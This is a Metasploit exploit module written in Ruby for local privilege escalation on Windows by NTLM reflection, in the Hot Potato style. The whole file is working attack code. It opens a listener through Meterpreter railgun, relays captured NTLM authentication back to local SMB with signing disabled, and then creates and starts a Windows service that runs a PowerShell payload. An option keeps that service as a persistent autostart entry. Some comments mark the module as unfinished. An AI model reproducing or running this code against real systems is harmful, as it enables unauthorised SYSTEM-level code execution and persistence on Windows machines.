##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core'

# Removed some things that should be included...
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  # errors with remove_socket
  # include Msf::Exploit::Remote::SMB::Client::Psexec
  include Rex::Constants::Windows
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec


  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Windows Local Priv NTLM Reflection',
        'Description'    => %q{
          This module relays NTLM Credentials from Windows via WebClient and replays them
          back to smb. It is usefull for local priv and other things, upon successful connect
          it will let you use powershell to execute a msf payload installed as a service.
          WebClient must be enabled but you can do that via the service_trigger post module.
          This module works for ALL windows versions, however you will need to find a vulnerable
          process running as SYSTEM that can connect to the localhost.
          },
        'Author'         =>
        [
            'vvalien'         # ... still delivering pizza =[
            # 'breenmachine', # Potato
            # 'tiraniddo'     # Orignal POC
          ],
        'License'        => MSF_LICENSE,
        'SessionTypes'   => [ 'meterpreter' ],
        'Payload'        =>
        {
            'Space'        => 3072,
            'DisableNops'  => true,
            'StackAdjustment' => -3500
        },
        'References'     =>
          [
            [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=222' ],
            [ 'URL', 'http://foxglovesecurity.com/2016/01/16/hot-potato/' ]
          ],
        'DisclosureDate' => 'Jan 01 1999',
        'Platform'       => 'win',
        'Arch'           => [ARCH_X86, ARCH_X86_64],
        'Targets'        =>
          [ # not fully implamented yet
            [ 'PowerShell', { } ],
            [ 'Native upload', { } ],
            [ 'MOF upload', { } ]
          ],
        'DefaultTarget'  => 0
      ))



    # No importing psexec this way, which errors out with remove_socket
    register_options([
        OptAddress.new('RHOST', [true, "The target address on local system", "127.0.0.1"]),
        OptPort.new('RPORT', [true, "Set the SMB service port", 445]),
        OptString.new('SERVICE_DESCRIPTION', [false, "Service description to to be used on target for pretty listing", nil]),
        OptString.new('SERVICE_DISPLAY_NAME', [false, "The service display name", nil]),
        OptString.new('SERVICE_NAME', [false, "The service name", nil])
        ], self.class)
    register_advanced_options([
        OptString.new('LocalHost', [false, "The server's internal IP address", "127.0.0.1"]),
        OptPort.new('LocalPort', [false, "The server's internal port", 80]), # \\127.0.0.1@SSL@4444\abc.gif
        OptBool.new('SERVICE_PERSIST', [false, "Create an Auto run service and do not remove it", false])
        ], self.class)
    # ReverseListenerComm will work!
    deregister_options('SMBPass', 'SMBUser', 'SMBDomain') # This is already set
  end

# would be nice to be able to do this!
=begin
  def smb_psexec_simple(ser_sock)
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    # ser_sock.psexec(command)
  end
=end

  # Its staying
  def exploit()
    setup_railgun()
    sleep(1)
  end

  # Use win api to create a tcp server on the box
  # This actually works really well, maybe consider adding this in future
  def setup_railgun()
    # Our new added function for railgun (send) will use rubys send.
    client.railgun.add_function('ws2_32', 'sendit', 'DWORD',[
      ["DWORD","s","in"],
      ["PCHAR","buf","in"],
      ["DWORD","len","in"],
      ["DWORD","flags","in"],
      ], windows_name='send')

    handler = client.railgun.ws2_32.socket('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP')
    sock = handler['return']

    # Setup our socket format
    # Incase you want to bind to something other than 127
    sock_addr = "\x02\x00"
    sock_addr << [datastore['LocalPort']].pack('n')
    sock_addr << Rex::Socket.addr_aton(datastore['LocalHost'])
    sock_addr << "\x00" * 8

    # Bind, Listen, and then block till we accept.
    r = client.railgun.ws2_32.bind(sock, sock_addr, 16)
    print_status("Socket bind with ws2_32")
    # Set the name here so we can kill it later!
    # random_service = Rex::Text.rand_text_alpha((rand(8)+6))
    begin
      # proc_start(random_service)
      # print_status("Process Started")
      r = client.railgun.ws2_32.listen(sock, 10)
      print_status("Socket is now listening on #{datastore['LocalHost']} we are waiting for a connect")
      r = client.railgun.ws2_32.accept(sock, nil, nil)
      @n_sock = r['return'] # our new socket
    rescue
      print_error("Something happened there was a error")
    else
      railgun_recv_smb_do # handels railgun recv and smb calls
    ensure
      # If we dont ensure it, it will hold 80 open until restart if error.
      print_status("Ensure we close the socket")
      client.railgun.ws2_32.closesocket(sock)
      client.railgun.ws2_32.closesocket(@n_sock)
      if @rsock
        @rsock.shutdown()
      end
      # kill_proc(random_service)
    end
  end

  # We simply send and msg using our new sendit function
  def resp_check_send(b64_ntlm)
    snd_buff = "HTTP/1.1 401 Unauthorized\n"
    snd_buff << "Server: PizzaDelivery/9 Bro/1.1.1\n"
    snd_buff << "Date: Thu, 1 Jan 1970 00:00:01 UTC\n"
    snd_buff << "WWW-Authenticate: NTLM #{b64_ntlm}\n"
    snd_buff << "Content-type: text/html\n"
    snd_buff << "Content-Length: 0\n\n"
    r = client.railgun.ws2_32.sendit(@n_sock, snd_buff, snd_buff.length, 0)
    sleep(1)
    return
  end

  def railgun_recv_smb_do()
    count = 1
    while count < 4 # incase of endless read loop
      nt = /NTLM\s((.)*)/ # If it works... keep it!
      r = client.railgun.ws2_32.recv(@n_sock, ' ' * 1024, 1024, 0)
      msg = r['buf']
      hash = (msg.match nt)
      if hash
        vprint_status("Got Hash1: #{hash[1]}")
        # No need to check which msg, we just continue here
        message = Rex::Text.decode_base64(hash[1])
        hash2, ser_sock = smb_relay_toserver1(message)
        vprint_status("Got Hash2: #{hash2}")
        resp_check_send(hash2)
        r = client.railgun.ws2_32.recv(@n_sock, ' ' * 1024, 1024, 0)
        msg = r['buf']
        hash3 = (msg.match nt)
        vprint_status("Got Hash3: #{hash3[1]}")
        hash3 = Rex::Text.decode_base64(hash3[1])
        ser_sock = smb_relay_toserver3(hash3, ser_sock)
        smb_pshell(ser_sock)
        break
      else
        print_status(msg.strip)
        resp_check_send(nil)
      end
        count += 1
    end
  end

  # Relay ntlm hash1 to smb
  def smb_relay_toserver1(hash)
    @rsock = Rex::Socket::Tcp.create(
      'PeerHost' => datastore['RHOST'],
      'PeerPort' => datastore['RPORT'],
      'Timeout'  => 3,
      'Comm'     => client, # OMFG!!! THE PAIN!!!
      'Context'  => { 'Msf' => framework, 'MsfExploit'=> self, }
       )

    if (not @rsock)
      print_error("Could not connect to target host (#{datastore['RHOST']})")
      return
    end
    ser_sock = Rex::Proto::SMB::SimpleClient.new(@rsock, datastore['RPORT'] == 445 ? true : false)

    if (datastore['RPORT'] == '139')
      ser_sock.client.session_request()
    end

    ser_sock.client.negotiate(true)
    ser_sock.client.require_signing = false

    print_status("Starting hash relay")
    resp = ser_sock.client.session_setup_with_ntlmssp_blob(hash, false) # if set true, it automagicly recv's
    print_status("Got the response")
    resp = ser_sock.client.smb_recv_parse(Rex::Proto::SMB::Constants::SMB_COM_SESSION_SETUP_ANDX, true)
    # Save the user_ID for future requests
    ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']

    begin
      # hash extraction
      ntlmsspblob = 'NTLMSSP' << (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) << "\x00\x00"
    rescue ::Exception => e
      print_error("Type 2 response not read properly from server")
      raise e
    end
    hash2_b64 = Rex::Text.encode_base64(ntlmsspblob)
    return [hash2_b64, ser_sock]
  end


  # relay ntlm hash3 to SMB
  def smb_relay_toserver3(hash, ser_sock)
    resp = ser_sock.client.session_setup_with_ntlmssp_blob(hash, false, ser_sock.client.auth_user_id)
    resp = ser_sock.client.smb_recv_parse(Rex::Proto::SMB::Constants::SMB_COM_SESSION_SETUP_ANDX, true)
    # check if auth was successful
    if (resp['Payload']['SMB'].v['ErrorClass'] == 0)
      print_status("SMB auth relay succeeded")
    else
      failure = Rex::Proto::SMB::Exceptions::ErrorCode.new
      failure.word_count = resp['Payload']['SMB'].v['WordCount']
      failure.command = resp['Payload']['SMB'].v['Command']
      failure.error_code = resp['Payload']['SMB'].v['ErrorClass']
      raise failure
    end
    return ser_sock
  end


  # Stolen from psexec I couldnt figure out how to overwrite the socket
  def smb_pshell(ser_sock)
    # Connect to the IPC share first
    ser_sock.client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")
    # The uuid for SVCCTL
    uuidv = ['367abb81-9844-35f1-ad32-98f038001003', '2.0']
    # Setup the svcctl handle
    handle = Rex::Proto::DCERPC::Handle.new(uuidv, 'ncacn_np', datastore['RHOST'], ["\\svcctl"])
    opts = {
      'Msf' => framework,
      'MsfExploit' => self,
      'smb_pipeio' => 'rw',
      'smb_client' => ser_sock
    }
    print_status("Bound to #{handle} ...")
    # Route the dcerpc pipe over our authenticated socket
    dcerpc = Rex::Proto::DCERPC::Client.new(handle, ser_sock.socket, opts)
    svc_client = Rex::Proto::DCERPC::SVCCTL::Client.new(dcerpc)
    # Open the scmanager
    scm_handle, scm_status = svc_client.openscmanagerw(datastore['RHOST'])
    # Check to see if persist is on
    if datastore['SERVICE_PERSIST']
      opts = { :start => SERVICE_AUTO_START }
    else
      opts = {}
    end
    peer = datastore['RHOST']
    vprint_status("#{peer} - Attempting to create the service...")
    service_name = datastore['SERVICE_NAME'] ||= Rex::Text.rand_text_alpha(8)
    display_name = datastore['SERVICE_DISPLAY_NAME'] ||= Rex::Text.rand_text_alpha(8)

    # This is where we get our payload at!
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)

    begin
      # remember svc_client is routed over our smb connection via dcerpc!
      svc_handle, svc_status = svc_client.createservicew(scm_handle, service_name, display_name, command, opts)
      print_status("Attempting to start service, error is normal")
      svc_status = svc_client.startservice(svc_handle)
      case svc_status
      when ERROR_SUCCESS
        print_status("#{peer} - Service started successfully...")
      when ERROR_FILE_NOT_FOUND
        print_error("#{peer} - Service failed to start - FILE_NOT_FOUND")
      when ERROR_ACCESS_DENIED
        print_error("#{peer} - Service failed to start - ACCESS_DENIED")
      when ERROR_SERVICE_REQUEST_TIMEOUT
        print_status("#{peer} - Service start timed out, OK if running a command or non-service executable...")
      else
        print_error("#{peer} - Service failed to start, ERROR_CODE: #{svc_status}")
      end # end case
      if datastore['SERVICE_PERSIST']
        print_warning("#{peer} - Not removing service for persistance...")
      else
        vprint_status("#{peer} - Removing the service...")
        svc_status = svc_client.deleteservice(svc_handle)
        if svc_status == ERROR_SUCCESS
          vprint_good("#{peer} - Successfully removed the sevice")
        else
          print_error("#{peer} - Unable to remove the service, ERROR_CODE: #{svc_status}")
        end
      end
    ensure
      vprint_status("#{peer} - Closing service handle... and killing the socket")
      svc_client.closehandle(svc_handle)
    end
  end
end

